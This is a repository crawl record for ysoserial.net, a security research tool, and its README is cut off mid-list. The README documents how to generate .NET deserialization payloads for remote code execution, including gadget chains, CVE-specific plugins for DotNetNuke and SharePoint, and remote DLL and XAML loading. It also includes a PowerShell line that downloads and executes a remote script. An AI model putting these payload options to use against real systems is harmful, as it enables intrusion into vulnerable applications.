{
  "metadata": {
    "timestamp": 1736710747936,
    "page": 181,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjE5MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "pwntester/ysoserial.net",
      "stars": 3295,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitattributes",
          "type": "blob",
          "size": 2.458984375,
          "content": "###############################################################################\n# Set default behavior to automatically normalize line endings.\n###############################################################################\n* text=auto\n\n###############################################################################\n# Set default behavior for command prompt diff.\n#\n# This is need for earlier builds of msysgit that does not have it on by\n# default for csharp files.\n# Note: This is only used by command line\n###############################################################################\n#*.cs     diff=csharp\n\n###############################################################################\n# Set the merge driver for project and solution files\n#\n# Merging from the command prompt will add diff markers to the files if there\n# are conflicts (Merging from VS is not affected by the settings below, in VS\n# the diff markers are never inserted). Diff markers may cause the following \n# file extensions to fail to load in VS. An alternative would be to treat\n# these files as binary and thus will always conflict and require user\n# intervention with every merge. To do so, just uncomment the entries below\n###############################################################################\n#*.sln       merge=binary\n#*.csproj    merge=binary\n#*.vbproj    merge=binary\n#*.vcxproj   merge=binary\n#*.vcproj    merge=binary\n#*.dbproj    merge=binary\n#*.fsproj    merge=binary\n#*.lsproj    merge=binary\n#*.wixproj   merge=binary\n#*.modelproj merge=binary\n#*.sqlproj   merge=binary\n#*.wwaproj   merge=binary\n\n###############################################################################\n# behavior for image files\n#\n# image files are treated as binary by default.\n###############################################################################\n#*.jpg   binary\n#*.png   binary\n#*.gif   binary\n\n###############################################################################\n# diff behavior for common document formats\n# \n# Convert binary document formats to text before diffing them. This feature\n# is only available from the command line. Turn it on by uncommenting the \n# entries below.\n###############################################################################\n#*.doc   diff=astextplain\n#*.DOC   diff=astextplain\n#*.docx  diff=astextplain\n#*.DOCX  diff=astextplain\n#*.dot   diff=astextplain\n#*.DOT   diff=astextplain\n#*.pdf   diff=astextplain\n#*.PDF   diff=astextplain\n#*.rtf   diff=astextplain\n#*.RTF   diff=astextplain\n"
        },
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 3.720703125,
          "content": "## Ignore Visual Studio temporary files, build results, and\n## files generated by popular Visual Studio add-ons.\n\n# User-specific files\n*.suo\n*.user\n*.userosscache\n*.sln.docstates\n\n# User-specific files (MonoDevelop/Xamarin Studio)\n*.userprefs\n\n# Build results\n[Dd]ebug/\n[Dd]ebugPublic/\n[Rr]elease/\n[Rr]eleases/\n[Xx]64/\n[Xx]86/\n[Bb]uild/\nbld/\n[Bb]in/\n[Oo]bj/\n\n# Visual Studio 2015 cache/options directory\n.vs/\n# Uncomment if you have tasks that create the project's static files in wwwroot\n#wwwroot/\n\n# MSTest test Results\n[Tt]est[Rr]esult*/\n[Bb]uild[Ll]og.*\n\n# NUNIT\n*.VisualState.xml\nTestResult.xml\n\n# Build Results of an ATL Project\n[Dd]ebugPS/\n[Rr]eleasePS/\ndlldata.c\n\n# DNX\nproject.lock.json\nartifacts/\n\n*_i.c\n*_p.c\n*_i.h\n*.ilk\n*.meta\n*.obj\n*.pch\n*.pdb\n*.pgc\n*.pgd\n*.rsp\n*.sbr\n*.tlb\n*.tli\n*.tlh\n*.tmp\n*.tmp_proj\n*.log\n*.vspscc\n*.vssscc\n.builds\n*.pidb\n*.svclog\n*.scc\n\n# Chutzpah Test files\n_Chutzpah*\n\n# Visual C++ cache files\nipch/\n*.aps\n*.ncb\n*.opendb\n*.opensdf\n*.sdf\n*.cachefile\n*.VC.db\n\n# Visual Studio profiler\n*.psess\n*.vsp\n*.vspx\n*.sap\n\n# TFS 2012 Local Workspace\n$tf/\n\n# Guidance Automation Toolkit\n*.gpState\n\n# ReSharper is a .NET coding add-in\n_ReSharper*/\n*.[Rr]e[Ss]harper\n*.DotSettings.user\n\n# JustCode is a .NET coding add-in\n.JustCode\n\n# TeamCity is a build add-in\n_TeamCity*\n\n# DotCover is a Code Coverage Tool\n*.dotCover\n\n# NCrunch\n_NCrunch_*\n.*crunch*.local.xml\nnCrunchTemp_*\n\n# MightyMoose\n*.mm.*\nAutoTest.Net/\n\n# Web workbench (sass)\n.sass-cache/\n\n# Installshield output folder\n[Ee]xpress/\n\n# DocProject is a documentation generator add-in\nDocProject/buildhelp/\nDocProject/Help/*.HxT\nDocProject/Help/*.HxC\nDocProject/Help/*.hhc\nDocProject/Help/*.hhk\nDocProject/Help/*.hhp\nDocProject/Help/Html2\nDocProject/Help/html\n\n# Click-Once directory\npublish/\n\n# Publish Web Output\n*.[Pp]ublish.xml\n*.azurePubxml\n\n# TODO: Un-comment the next line if you do not want to checkin\n# your web deploy settings because they may include unencrypted\n# passwords\n#*.pubxml\n*.publishproj\n\n# NuGet Packages\n*.nupkg\n# The packages folder can be ignored because of Package Restore\n**/packages/*\n# except build/, which is used as an MSBuild target.\n!**/packages/build/\n# Uncomment if necessary however generally it will be regenerated when needed\n#!**/packages/repositories.config\n# NuGet v3's project.json files produces more ignoreable files\n*.nuget.props\n*.nuget.targets\n\n# Microsoft Azure Build Output\ncsx/\n*.build.csdef\n\n# Microsoft Azure Emulator\necf/\nrcf/\n\n# Windows Store app package directory\nAppPackages/\nBundleArtifacts/\n\n# Visual Studio cache files\n# files ending in .cache can be ignored\n*.[Cc]ache\n# but keep track of directories ending in .cache\n!*.[Cc]ache/\n\n# Others\nClientBin/\n[Ss]tyle[Cc]op.*\n~$*\n*~\n*.dbmdl\n*.dbproj.schemaview\n*.pfx\n*.publishsettings\nnode_modules/\norleans.codegen.cs\n\n# RIA/Silverlight projects\nGenerated_Code/\n\n# Backup & report files from converting an old project file\n# to a newer Visual Studio version. Backup files are not needed,\n# because we have git ;-)\n_UpgradeReport_Files/\nBackup*/\nUpgradeLog*.XML\nUpgradeLog*.htm\n\n# SQL Server files\n*.mdf\n*.ldf\n\n# Business Intelligence projects\n*.rdl.data\n*.bim.layout\n*.bim_*.settings\n\n# Microsoft Fakes\nFakesAssemblies/\n\n# GhostDoc plugin setting file\n*.GhostDoc.xml\n\n# Node.js Tools for Visual Studio\n.ntvs_analysis.dat\n\n# Visual Studio 6 build log\n*.plg\n\n# Visual Studio 6 workspace options file\n*.opt\n\n# Visual Studio LightSwitch build output\n**/*.HTMLClient/GeneratedArtifacts\n**/*.DesktopClient/GeneratedArtifacts\n**/*.DesktopClient/ModelManifest.xml\n**/*.Server/GeneratedArtifacts\n**/*.Server/ModelManifest.xml\n_Pvt_Extensions\n\n# LightSwitch generated files\nGeneratedArtifacts/\nModelManifest.xml\n\n# Paket dependency manager\n.paket/paket.exe\n\n# FAKE - F# Make\n.fake/\n\n# Tests\nysoserial/Helpers/TestingArena/\n\n# Rider\n.idea"
        },
        {
          "name": "CONTRIBUTING.md",
          "type": "blob",
          "size": 0.2265625,
          "content": "## Contributing\n- Fork it\n- Create your feature branch (`git checkout -b my-new-feature`)\n- Commit your changes (`git commit -am 'Add some feature'`)\n- Push to the branch (`git push origin my-new-feature`)\n- Create new Pull Request\n"
        },
        {
          "name": "ExploitClass",
          "type": "tree",
          "content": null
        },
        {
          "name": "LICENSE.txt",
          "type": "blob",
          "size": 1.0498046875,
          "content": "Copyright (c) 2017-2019 Alvaro Mu√±oz\n\nMIT License\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n\"Software\"), to deal in the Software without restriction, including\nwithout limitation the rights to use, copy, modify, merge, publish,\ndistribute, sublicense, and/or sell copies of the Software, and to\npermit persons to whom the Software is furnished to do so, subject to\nthe following conditions:\n\nThe above copyright notice and this permission notice shall be\nincluded in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\nNONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE\nLIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\nOF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\nWITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 62.2392578125,
          "content": "![logo](/logo.png)\n---\n![GitHub CI](https://github.com/pwntester/ysoserial.net/workflows/Build/badge.svg?branch=master)\n[![v2](https://img.shields.io/azure-devops/build/alvaro0002/ysoserial.net/1/v2.svg?label=v2%20branch)](https://dev.azure.com/alvaro0002/ysoserial.net/_build/latest?definitionId=1&branchName=v2)\n[![download](https://img.shields.io/badge/download-latest-blue.svg)](https://github.com/pwntester/ysoserial.net/releases/latest)\n[![license](https://img.shields.io/github/license/pwntester/ysoserial.net.svg)](LICENSE.txt)\n![stars](https://img.shields.io/github/stars/pwntester/ysoserial.net.svg?style=social)\n![forks](https://img.shields.io/github/forks/pwntester/ysoserial.net.svg?style=social)\n\nA proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.\n\n## Description\nysoserial.net is a collection of utilities and property-oriented programming \"gadget chains\" discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.\n\nIt should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having gadgets on the classpath.\n\nThis project is inspired by [Chris Frohoff's ysoserial project](https://github.com/frohoff/ysoserial)\n\n## Disclaimer \nThis software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.\n\nThis software is a personal project and not related with any companies, including Project owner and contributors employers.\n\n## Installation\nIn order to obtain the latest version, it is recommended to download it from [the Actions page](https://github.com/pwntester/ysoserial.net/actions).\n\nYou can install the previous releases of YSoSerial.NET from [the releases page](https://github.com/pwntester/ysoserial.net/releases)\n\n## Build from source:\n\n```powershell\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))\n\nchoco install visualstudio2022community --yes\nchoco install visualstudio2022-workload-nativedesktop --yes\nchoco install choco install msbuild.communitytasks --yes\nchoco install nuget.commandline --yes\nchoco install git --yes\n\ngit clone https://github.com/pwntester/ysoserial.net\ncd ysoserial.net\nnuget restore ysoserial.sln\nmsbuild ysoserial.sln -p:Configuration=Release\n\n.\\ysoserial\\bin\\Release\\ysoserial.exe -h\n```\n\n\n## Usage\n```\n$ ./ysoserial.exe --fullhelp\nysoserial.net generates deserialization payloads for a variety of .NET formatters.\n\n== GADGETS ==\n\t(*) ActivitySurrogateDisableTypeCheck [Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored]\n\t\tFormatters: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter\n\t\t\tLabels: Not bridge but derived\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Choices: 1 -> use TypeConfuseDelegateGenerator \n\t\t\t                               [default], 2 -> use \n\t\t\t                               TextFormattingRunPropertiesMarshal\n\t\t\t\n\t(*) ActivitySurrogateSelector [This gadget ignores the command parameter and executes the constructor of ExploitClass class]\n\t\tFormatters: BinaryFormatter (2), LosFormatter, SoapFormatter\n\t\t\tLabels: Not bridge or derived\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Payload variant number where applicable. \n\t\t\t                               Choices: 1 (default), 2 (shorter but may not \n\t\t\t                               work between versions)\n\t\t\t\n\t(*) ActivitySurrogateSelectorFromFile [Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use a semicolon to separate the file from any additional required assemblies, e.g., '-c ExploitClass.cs;System.Windows.Forms.dll']\n\t\tFormatters: BinaryFormatter (2), LosFormatter, SoapFormatter\n\t\t\tLabels: Not bridge or derived\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Payload variant number where applicable. \n\t\t\t                               Choices: 1 (default), 2 (shorter but may not \n\t\t\t                               work between versions)\n\t\t\t\n\t(*) AxHostState\n\t\tFormatters: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter\n\t\t\tLabels: Bridge and derived\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t(*) BaseActivationFactory [Gadget for .NET 5/6/7 with WPF enabled or Microsoft.WindowsDesktop.App\\PresentationFramework.dll available. Leads to remote DLL loading (native C/C++ DLL)]\n\t\tFormatters: Json.NET\n\t\t\tLabels: Not bridge or derived, .NET 5/6/7, Requires WPF enabled or PresentationFramework.dll\n\t(*) ClaimsIdentity\n\t\tFormatters: BinaryFormatter, LosFormatter, SoapFormatter\n\t\t\tLabels: Bridge and derived, OnDeserialized\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t(*) ClaimsPrincipal\n\t\tFormatters: BinaryFormatter, LosFormatter, SoapFormatter\n\t\t\tLabels: Bridge and derived, OnDeserialized, SecondOrderDeserialization\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t(*) DataSet\n\t\tFormatters: BinaryFormatter, LosFormatter, SoapFormatter\n\t\t\tLabels: Bridge and derived\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t(*) DataSetOldBehaviour [This gadget targets an old behavior of DataSet which uses XML format]\n\t\tFormatters: BinaryFormatter, LosFormatter\n\t\t\tLabels: Bridge and derived\n\t\t\tSupported formatter for the bridge: LosFormatter\n\t\t\tExtra options:\n\t\t\t      --spoofedAssembly=VALUE\n\t\t\t                             The assembly name you want to use in the \n\t\t\t                               generated serialized object (example: 'mscorlib')\n\t\t\t\n\t(*) DataSetOldBehaviourFromFile [Another variant of the DataSetOldBehaviour gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use a semicolon to separate the file from any additional required assemblies, e.g., '-c ExploitClass.cs;System.Windows.Forms.dll']\n\t\tFormatters: BinaryFormatter, LosFormatter\n\t\t\tLabels: Bridge and derived\n\t\t\tExtra options:\n\t\t\t      --spoofedAssembly=VALUE\n\t\t\t                             The assembly name you want to use in the \n\t\t\t                               generated serialized object (example: 'mscorlib')\n\t\t\t\n\t(*) DataSetTypeSpoof [A more advanced type spoofing that can use any arbitrary types can be seen in TestingArenaHome::SpoofByBinaryFormatterJson or in the DataSetOldBehaviour gadget]\n\t\tFormatters: BinaryFormatter, LosFormatter, SoapFormatter\n\t\t\tLabels: Bridge and derived\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t(*) GenericPrincipal\n\t\tFormatters: BinaryFormatter, LosFormatter\n\t\t\tLabels: Bridge and derived, OnDeserialized, SecondOrderDeserialization\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Payload variant number where applicable. \n\t\t\t                               Choices: 1 (uses serialized ClaimsIdentities), 2 \n\t\t\t                               (uses serialized Claims)\n\t\t\t\n\t(*) GetterCompilerResults [Remote DLL loading gadget for .NET 5/6/7 with WPF enabled (mixed DLL). Local DLL loading for .NET Framework if System.CodeDom is available. DLL path delivered with -c argument]\n\t\tFormatters: Json.NET\n\t\t\tLabels: Chain of arbitrary getter call and not derived gadget, Remote DLL loading for .NET 5/6/7 with WPF Enabled, Local DLL loading for .NET Framework if System.CodeDom is available\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Variant number. Variant defines a different \n\t\t\t                               getter-call gadget. Choices: \n\n\t\t\t                               1 (default) - PropertyGrid getter-call gadget, \n\n\t\t\t                               2 - ComboBox getter-call gadget (may load DLL \n\t\t\t                               twice)\n\n\t\t\t                               3 - ListBox getter-call gadget\n\n\t\t\t                               4 - CheckedListBox getter-call gadget\n\t\t\t\n\t(*) GetterSecurityException\n\t\tFormatters: Json.NET\n\t\t\tLabels: Chain of arbitrary getter call and derived gadget\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Variant number. Variant defines a different \n\t\t\t                               getter-call gadget. Choices: \n\n\t\t\t                               1 (default) - PropertyGrid getter-call gadget, \n\n\t\t\t                               2 - ComboBox getter-call gadget (may execute \n\t\t\t                               code twice)\n\n\t\t\t                               3 - ListBox getter-call gadget\n\n\t\t\t                               4 - CheckedListBox getter-call gadget\n\t\t\t\n\t(*) GetterSettingsPropertyValue\n\t\tFormatters: Json.NET, MessagePackTypeless, MessagePackTypelessLz4, Xaml\n\t\t\tLabels: Chain of arbitrary getter call and derived gadget\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Variant number. Variant defines a different \n\t\t\t                               getter-call gadget. Choices: \n\n\t\t\t                               1 (default) - PropertyGrid getter-call gadget, \n\n\t\t\t                               2 - ComboBox getter-call gadget (may execute \n\t\t\t                               code twice)\n\n\t\t\t                               3 - ListBox getter-call gadget\n\n\t\t\t                               4 - CheckedListBox getter-call gadget\n\t\t\t\n\t(*) ObjectDataProvider\n\t\tFormatters: DataContractSerializer (2), FastJson, FsPickler, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml (4), XmlSerializer (2), YamlDotNet < 5.0.0\n\t\t\tLabels: Not bridge or derived\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Payload variant number where applicable. \n\t\t\t                               Choices: 1, 2, 3, ... based on formatter.\n\t\t\t      --xamlurl=VALUE        This is to create a very short payload when \n\t\t\t                               affected box can read the target XAML URL e.g. \n\t\t\t                               \"http://b8.ee/x\" (can be a file path on a shared \n\t\t\t                               drive or the local system). This is used by the \n\t\t\t                               3rd XAML payload which is a ResourceDictionary \n\t\t\t                               with the Source parameter. Command parameter \n\t\t\t                               will be ignored. The shorter the better!\n\t\t\t\n\t(*) ObjRef\n\t\tFormatters: BinaryFormatter, LosFormatter, ObjectStateFormatter, SoapFormatter\n\t\t\tLabels: Not bridge or derived\n\t(*) PSObject [Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017)]\n\t\tFormatters: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter\n\t\t\tLabels: Not bridge but derived\n\t(*) ResourceSet\n\t\tFormatters: BinaryFormatter, LosFormatter, NetDataContractSerializer\n\t\t\tLabels: It relies on other gadgets and is not a real gadget on its own (not bridged or derived either)\n\t\t\tExtra options:\n\t\t\t      --ig, --internalgadget=VALUE\n\t\t\t                             The numerical internal gadget choice to use: \n\t\t\t                               1=TypeConfuseDelegate, \n\t\t\t                               2=TextFormattingRunProperties (default: 1 \n\t\t\t                               [TypeConfuseDelegate])\n\t\t\t\n\t(*) RolePrincipal\n\t\tFormatters: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter\n\t\t\tLabels: Bridge and derived\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t(*) SessionSecurityToken\n\t\tFormatters: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter\n\t\t\tLabels: Bridge and derived\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t(*) SessionViewStateHistoryItem\n\t\tFormatters: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter\n\t\t\tLabels: Bridge and derived\n\t\t\tSupported formatter for the bridge: LosFormatter\n\t(*) TextFormattingRunProperties [This normally generates the shortest payload]\n\t\tFormatters: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter\n\t\t\tLabels: Not bridge but derived\n\t\t\tExtra options:\n\t\t\t      --xamlurl=VALUE        This is to create a very short payload when \n\t\t\t                               affected box can read the target XAML URL e.g. \n\t\t\t                               \"http://b8.ee/x\" (can be a file path on a shared \n\t\t\t                               drive or the local system). This is used by the \n\t\t\t                               3rd XAML payload of ObjectDataProvider which is \n\t\t\t                               a ResourceDictionary with the Source parameter. \n\t\t\t                               Command parameter will be ignored. The shorter \n\t\t\t                               the better!\n\t\t\t      --hasRootDCS           To include a root element with the \n\t\t\t                               DataContractSerializer payload.\n\t\t\t\n\t(*) ToolboxItemContainer\n\t\tFormatters: BinaryFormatter, LosFormatter, SoapFormatter\n\t\t\tLabels: Bridge and derived\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t(*) TypeConfuseDelegate\n\t\tFormatters: BinaryFormatter, LosFormatter, NetDataContractSerializer\n\t\t\tLabels: Not bridge or derived\n\t(*) TypeConfuseDelegateMono [Tweaked TypeConfuseDelegate gadget to work with Mono]\n\t\tFormatters: BinaryFormatter, LosFormatter, NetDataContractSerializer\n\t\t\tLabels: Not bridge or derived\n\t(*) WindowsClaimsIdentity [Requires Microsoft.IdentityModel.Claims namespace (not default GAC)]\n\t\tFormatters: BinaryFormatter (3), DataContractSerializer (2), Json.NET (2), LosFormatter (3), NetDataContractSerializer (3), SoapFormatter (2)\n\t\t\tLabels: Bridge and derived, Not in GAC\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Payload variant number where applicable. \n\t\t\t                               Choices: 1, 2, or 3 based on formatter.\n\t\t\t\n\t(*) WindowsIdentity\n\t\tFormatters: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter\n\t\t\tLabels: Bridge and derived\n\t\t\tSupported formatter for the bridge: BinaryFormatter\n\t(*) WindowsPrincipal\n\t\tFormatters: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter\n\t\t\tLabels: Bridge and derived\n\t(*) XamlAssemblyLoadFromFile [Loads assembly using XAML. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use a semicolon to separate the file from any additional required assemblies, e.g., '-c ExploitClass.cs;System.Windows.Forms.dll']\n\t\tFormatters: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter\n\t\t\tLabels: Not bridge but derived\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Choices: 1 -> use TypeConfuseDelegateGenerator \n\t\t\t                               [default], 2 -> use \n\t\t\t                               TextFormattingRunPropertiesMarshal\n\t\t\t\n\t(*) XamlImageInfo [Gadget leads to XAML deserialization. Variant 1 (GAC) reads XAML from file (local path or UNC path can be given). Variant 2 (non-GAC) delivers XAML directly, but requires Microsoft.Web.Deployment.dll]\n\t\tFormatters: Json.NET\n\t\t\tLabels: Not bridge but derived, Variant 1 in GAC, Variant 2 not in GAC\n\t\t\tExtra options:\n\t\t\t      --var, --variant=VALUE Variant number. Variant defines a different \n\t\t\t                               Stream delivery class. Choices: \n\n\t\t\t                               1 (default and GAC) - LazyFileStream for Stream \n\t\t\t                               delivery, file path has to be provided for -c \n\t\t\t                               argument (UNC or local) \n\n\t\t\t                               2 (non-GAC, requires Microsoft.Web.Deploymen-\n\t\t\t                               t.dll) - ReadOnlyStreamFromStrings for Stream \n\t\t\t                               delivery, command to execute can be provided for \n\t\t\t                               -c argument\n\t\t\t\n\n== PLUGINS ==\n\t(*) ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)\n\t\tOptions:\n\t\t  -c, --command=VALUE        the command to be executed.\n\t\t  -u, --url=VALUE            the url passed to Activator.GetObject.\n\t\t  -s                         if TCPChannel security should be enabled.\n\t\t\n\t(*) Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)\n\t\tOptions:\n\t\t  -M, --mode=VALUE           the payload mode: HttpStaticObjectsCollection or \n\t\t                               SessionStateItemCollection. Default: \n\t\t                               HttpStaticObjectsCollection\n\t\t  -o, --output=VALUE         the output format (raw|base64).\n\t\t  -c, --command=VALUE        the command to be executed\n\t\t  -t, --test                 whether to run payload locally. Default: false\n\t\t      --minify               Whether to minify the payloads where applicable \n\t\t                               (experimental). Default: false\n\t\t      --ust, --usesimpletype This is to remove additional info only when \n\t\t                               minifying and FormatterAssemblyStyle=Simple. \n\t\t                               Default: true\n\t\t\n\t(*) ApplicationTrust (Generates XML payload for the ApplicationTrust class)\n\t\tOptions:\n\t\t  -c, --command=VALUE        the command to be executed\n\t\t  -t, --test                 whether to run payload locally. Default: false\n\t\t      --minify               Whether to minify the payloads where applicable \n\t\t                               (experimental). Default: false\n\t\t      --ust, --usesimpletype This is to remove additional info only when \n\t\t                               minifying and FormatterAssemblyStyle=Simple. \n\t\t                               Default: true\n\t\t\n\t(*) Clipboard (Generates payload for DataObject and copies it into the clipboard - ready to be pasted in affected apps)\n\t\tOptions:\n\t\t  -F, --format=VALUE         the object format: Csv, DeviceIndependentBitmap, \n\t\t                               DataInterchangeFormat, PenData, RiffAudio, \n\t\t                               WindowsForms10PersistentObject, System.String, \n\t\t                               SymbolicLink, TaggedImageFileFormat, WaveAudio. \n\t\t                               Default: WindowsForms10PersistentObject (the \n\t\t                               only one that works in Feb 2020 as a result of \n\t\t                               an incomplete silent patch - will not be useful \n\t\t                               to target text-based fields anymore)\n\t\t  -c, --command=VALUE        the command to be executed\n\t\t  -t, --test                 whether to run payload locally. Default: false\n\t\t      --minify               Whether to minify the payloads where applicable \n\t\t                               (experimental). Default: false\n\t\t      --ust, --usesimpletype This is to remove additional info only when \n\t\t                               minifying and FormatterAssemblyStyle=Simple. \n\t\t                               Default: true\n\t\t\n\t(*) DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)\n\t\tOptions:\n\t\t  -m, --mode=VALUE           the payload mode: read_file, write_file, \n\t\t                               run_command.\n\t\t  -c, --command=VALUE        the command to be executed in run_command mode.\n\t\t  -u, --url=VALUE            the url to fetch the file from in write_file \n\t\t                               mode.\n\t\t  -f, --file=VALUE           the file to read in read_file mode or the file \n\t\t                               to write to in write_file_mode.\n\t\t      --minify               Whether to minify the payloads where applicable \n\t\t                               (experimental). Default: false\n\t\t\n\t(*) GetterCallGadgets (Implements arbitrary getter call gadgets for .NET Framework and .NET 5/6/7 with WPF enabled, run with -l for more help)\n\t\tOptions:\n\t\t  -l                         prints list of implemented gadgets\n\t\t  -i, --inner=VALUE          file containing inner-gadget\n\t\t  -g, --gadget=VALUE         gadget to use\n\t\t  -m, --member=VALUE         getter to call (required for some gadgets)\n\t\t  -t                         test gadget (execute)\n\t\t      --minify               minify gadget\n\t\t\n\t(*) MachineKeySessionSecurityTokenHandler (Generates XML payload for the MachineKeySessionSecurityTokenHandler class)\n\t\tOptions:\n\t\t  -c, --command=VALUE        the command to be executed e.g. \"cmd /c calc\"\n\t\t  -t, --test                 In this scenario, the test mode should not be \n\t\t                               applied, as the sink point relies on the web \n\t\t                               environment. Default: false\n\t\t      --minify               Whether to minify the payloads where applicable \n\t\t                               (experimental). Default: false\n\t\t      --ust, --usesimpletype This is to remove additional info only when \n\t\t                               minifying and FormatterAssemblyStyle=Simple. \n\t\t                               Default: true\n\t\t      --vk, --validationkey=VALUE\n\t\t                             Enter the validationKey from the web.config\n\t\t      --ek, --decryptionkey=VALUE\n\t\t                             Enter the decryptionKey from the web.config\n\t\t      --va, --validationalg=VALUE\n\t\t                             Enter the validation from the web.config. \n\t\t                               Default: HMACSHA1. e.g: \n\t\t                               HMACSHA1/HMACSHA256/HMACSHA384/HMACSHA512\n\t\t      --da, --decryptionalg=VALUE\n\t\t                             Enter the decryption from the web.config. \n\t\t                               Default: AES. e.g: AES/DES/3DES\n\t\t\n\t(*) NetNonRceGadgets (Implements Non-RCE gadgets for .NET Framework)\n\t\tOptions:\n\t\t  -l                         prints list of implemented gadgets\n\t\t  -i, --input=VALUE          input to the gadget\n\t\t  -g, --gadget=VALUE         gadget to use\n\t\t  -f, --formatter=VALUE      Formatter to use\n\t\t  -t                         test gadget (execute after generation)\n\t\t      --minify               minify gadget\n\t\t\n\t(*) Resx (Generates RESX and .RESOURCES files)\n\t\tOptions:\n\t\t  -M, --mode=VALUE           the payload mode: indirect_resx_file, \n\t\t                               CompiledDotResources (useful for CVE-2020-0932 \n\t\t                               for example), BinaryFormatter, SoapFormatter.\n\t\t  -c, --command=VALUE        the command to be executed in BinaryFormatter \n\t\t                               and CompiledDotResources. If this is provided \n\t\t                               for SoapFormatter, it will be used as a file for \n\t\t                               ActivitySurrogateSelectorFromFile\n\t\t  -g, --gadget=VALUE         The gadget chain used for BinaryFormatter and \n\t\t                               CompiledDotResources (default: \n\t\t                               TextFormattingRunProperties).\n\t\t  -F, --file=VALUE           UNC file path location: this is used in \n\t\t                               indirect_resx_file mode.\n\t\t      --of, --outputfile=VALUE\n\t\t                             a file path location for CompiledDotResources to \n\t\t                               store the .resources file (default: payloa-\n\t\t                               d.resources)\n\t\t  -t, --test                 Whether to run payload locally. Default: false\n\t\t      --minify               Whether to minify the payloads where applicable \n\t\t                               (experimental). Default: false\n\t\t      --ust, --usesimpletype This is to remove additional info only when \n\t\t                               minifying and FormatterAssemblyStyle=Simple. \n\t\t                               Default: true\n\t\t\n\t(*) SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)\n\t\tOptions:\n\t\t  -c, --command=VALUE        the command to be executed e.g. \"cmd /c calc\"\n\t\t  -t, --test                 whether to run payload locally. Default: false\n\t\t      --minify               Whether to minify the payloads where applicable \n\t\t                               (experimental). Default: false\n\t\t      --ust, --usesimpletype This is to remove additional info only when \n\t\t                               minifying and FormatterAssemblyStyle=Simple. \n\t\t                               Default: true\n\t\t\n\t(*) SharePoint (Generates payloads for the following SharePoint CVEs: CVE-2020-1147, CVE-2019-0604, 